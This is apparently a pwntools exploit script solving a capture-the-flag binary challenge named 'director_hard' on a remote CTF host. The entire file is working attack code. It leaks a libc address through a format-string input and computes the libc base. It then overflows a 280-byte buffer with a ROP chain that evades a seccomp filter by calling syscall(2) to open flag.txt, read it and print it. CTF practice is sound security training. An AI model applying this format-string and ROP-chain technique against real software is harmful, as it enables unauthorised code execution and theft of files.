from pwn import *
import os

exe = './director_hard' 
elf = ELF(exe)
context.binary = exe

libc = ELF('./libc.so.6')
#p = remote(exe)
p = remote('challs.ctf.cert.unlp.edu.ar', 51693)

# ==========================================================
# STEP 1: Leak
# ==========================================================
p.sendlineafter(b'Input:', b'%41$p')
p.recvuntil(b'You entered:')
leak = int(p.recvline().strip(), 16)
log.info(f'Leaked address: {hex(leak)}')

# Calculate Base
libc.address = leak - libc.libc_start_main_return
log.info(f'Libc base address: {hex(libc.address)}')

# ==========================================================
# STEP 2: ROP Chain (Seccomp Bypass)
# ==========================================================
rop = ROP(libc)
bss_add = elf.bss()

# 1. Stack Alignment
rop.raw(rop.find_gadget(['ret']).address) 

# 2. Write filename to BSS
rop.read(0, bss_add, 0x30)

# 3. FORCE SYSCALL #2 (open)
# We use libc.syscall(2, filename, 0) to avoid 'openat'
# Arguments: (Syscall Num, Arg1, Arg2) -> (RDI, RSI, RDX)
# The libc wrapper moves RDI->RAX (2), RSI->RDI (filename), RDX->RSI (0)
rop.call(libc.sym['syscall'], [2, bss_add, 0])

# 4. Read content (File Descriptor is usually 3)
rop.read(3, bss_add, 0x50)

# 5. Write content to stdout
rop.write(1, bss_add, 0x50)

# ==========================================================
# STEP 3: Payload
# ==========================================================
offset = 280
payload = b'A' * offset + rop.chain()

p.sendlineafter(b'Input:', payload)

# Wait for ROP to start
time.sleep(1) 

# Send filename
p.send(b"flag.txt\x00")

p.interactive()
